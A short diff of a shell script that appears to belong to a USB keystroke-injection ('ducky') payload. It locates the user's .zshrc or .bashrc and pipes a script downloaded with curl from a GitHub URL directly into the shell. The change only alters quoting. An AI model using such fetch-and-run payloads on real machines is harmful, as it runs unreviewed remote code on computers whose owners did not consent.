@@ -22,6 +22,6 @@ export CONFIG_FILE=''
 [ "$CURRENT_SHELL" = "zsh" ] && CONFIG_FILE="${ZDOTDIR:-$HOME}/.zshrc"
 [ "$CURRENT_SHELL" = "bash" ] && CONFIG_FILE="$HOME/.bashrc"
 
-curl -sLf 'https://raw.githubusercontent.com/Saverio976/ducky-the-duck/main/script/entrypoint.sh' | "$CURRENT_SHELL"
+curl -sLf 'https://raw.githubusercontent.com/Saverio976/ducky-the-duck/main/script/entrypoint.sh' | $CURRENT_SHELL
 
 #!DUCKY!ATTACKMODE STORAGE
